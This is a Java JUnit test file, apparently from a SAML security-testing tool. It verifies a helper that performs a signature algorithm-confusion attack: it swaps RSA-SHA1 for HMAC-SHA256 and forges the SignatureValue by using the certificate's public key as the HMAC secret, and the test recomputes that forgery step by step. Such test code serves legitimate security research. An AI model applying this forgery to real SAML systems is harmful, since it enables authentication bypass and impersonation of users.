package helpers;

import org.apache.xml.security.Init;
import org.apache.xml.security.c14n.Canonicalizer;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayInputStream;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.Base64;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;

public class HMACConfusionTest {

    private static final String HMAC_SHA256_URI =
            "http://www.w3.org/2001/04/xmldsig-more#hmac-sha256";

    /// Test X.509 cert borrowed from CVE_2022_41912_Test. The attack only needs
    /// the embedded public key; certificate validity dates are irrelevant.
    private static final String CERT_B64 =
            "MIIC6TCCAdGgAwIBAgIIHC0ZtKe0AzswDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UEAxMOc2FtbC1pZHAtbG9jYWwwHhcNMjUwOTIzMTEwNDEwWhcNMjYwOTIzMTIwNDEwWjAZMRcwFQYDVQQDEw5zYW1sLWlkcC1sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOBOjNVc6C9uDgkRZ30lBz97rRnm8Us1t8/I8hYTLuIsNg3Rs5S2OMmJYnvMeMEYBJGFXqMEtqpRJkDVJujk1NKCB5bJJwadjFULruNF8NnO7G99q+XG1S2fxjDgi+Im/U2+dBmMJNWAJDc54hIBZbv+7jQXUiXQrnaDUX79OGNxQ/I5IC9wLK1xb1wywM4vWx5TrQXfbeMJwYOG3NAGGLayOCjrfIz4yIya8+rzSqWc4ZY0a+VPRFWmaooDw878pQuQJaijFWZbTdSXAwz7Dgm3jeLw/9roYADFtFqK3YMFBg3R8NM6GRhmFce6B9pbu5GM7+uUXFHWFJ2go5MhfOECAwEAAaM1MDMwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBACCpxbXeD8VL+V38f/qrP7H69oP6BHF/snZxmkI8FhsxSPGN9HKZxZpHy8DxLGB/dER4m6pekhpx2NhrNKreh/z4WTYTyI8hALBdZ32XTzDXJtcDIu0znlbngMFgZ+H+GcC9TmIET2FBXpKXnp0On6EsgLZf0NsPVLjcYgfxT9v3DTJqzVajjrK6dSIcoUsswbb0veV11ao3GYkkr/6Mrfb5AB5c+tMe33zJyTlpXEQLa6uwvYLNSWIfySfQcjZUFJpzCvfWVXUdiESn1HSYLz95uFru57syVm6ReI0WulOGL0YvJz/inL9J2QNO11z3Qr95hJYJ/j+k/IGOMcwOAD4=";

    private static final String SAML_TEMPLATE = """
            <?xml version="1.0" encoding="UTF-8"?>
            <samlp:Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="r1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
              <saml:Assertion ID="a1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
                <saml:Issuer>https://idp.example.com</saml:Issuer>
                <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                  <ds:SignedInfo>
                    <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                    <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
                    <ds:Reference URI="#a1">
                      <ds:Transforms>
                        <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
                        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                      </ds:Transforms>
                      <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
                      <ds:DigestValue>PLACEHOLDER</ds:DigestValue>
                    </ds:Reference>
                  </ds:SignedInfo>
                  <ds:SignatureValue>ORIGINAL_RSA_SIG</ds:SignatureValue>
                  <ds:KeyInfo>
                    <ds:X509Data>
                      <ds:X509Certificate>%s</ds:X509Certificate>
                    </ds:X509Data>
                  </ds:KeyInfo>
                </ds:Signature>
                <saml:Subject>
                  <saml:NameID>user@example.com</saml:NameID>
                </saml:Subject>
              </saml:Assertion>
            </samlp:Response>
            """;

    /// End-to-end: apply the attack, then independently re-canonicalize SignedInfo
    /// and recompute HMAC-SHA256 with the cert's public key to verify the
    /// SignatureValue the implementation produced is actually valid.
    @Test
    void swapsSignatureMethodAndRecomputesValidHmac() throws Exception {
        String input = SAML_TEMPLATE.formatted(CERT_B64);

        String out = HMACConfusion.apply(input);
        Document doc = new XMLHelpers().getXMLDocumentOfSAMLMessage(out);

        // 1) SignatureMethod Algorithm must be swapped to HMAC-SHA256.
        Element sigMethod = (Element) doc.getElementsByTagNameNS("*", "SignatureMethod").item(0);
        assertNotNull(sigMethod, "SignatureMethod element missing from output");
        assertEquals(HMAC_SHA256_URI, sigMethod.getAttribute("Algorithm"));

        // 2) SignatureValue must have been replaced (not the original placeholder).
        Element sigValue = (Element) doc.getElementsByTagNameNS("*", "SignatureValue").item(0);
        assertNotNull(sigValue, "SignatureValue element missing from output");
        String actualSig = sigValue.getTextContent().trim();
        assertNotEquals("ORIGINAL_RSA_SIG", actualSig,
                "SignatureValue must have been overwritten");

        // 3) Recompute HMAC independently and confirm byte-for-byte equality.
        //    key = SubjectPublicKeyInfo DER (X509Certificate.getPublicKey().getEncoded())
        //    data = exclusive-C14N-no-comments canonicalization of SignedInfo (post-swap)
        Init.init();
        Element signedInfo = (Element) doc.getElementsByTagNameNS("*", "SignedInfo").item(0);
        byte[] canonBytes = Canonicalizer.getInstance(
                Canonicalizer.ALGO_ID_C14N_EXCL_OMIT_COMMENTS).canonicalizeSubtree(signedInfo);

        byte[] certBytes = Base64.getDecoder().decode(CERT_B64);
        X509Certificate cert = (X509Certificate) CertificateFactory.getInstance("X.509")
                .generateCertificate(new ByteArrayInputStream(certBytes));
        byte[] keyBytes = cert.getPublicKey().getEncoded();

        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(keyBytes, "HmacSHA256"));
        String expectedSig = Base64.getEncoder().encodeToString(mac.doFinal(canonBytes));

        assertEquals(expectedSig, actualSig,
                "SignatureValue must equal HMAC-SHA256(SubjectPublicKeyInfo_DER, canonical(SignedInfo))");
    }
}
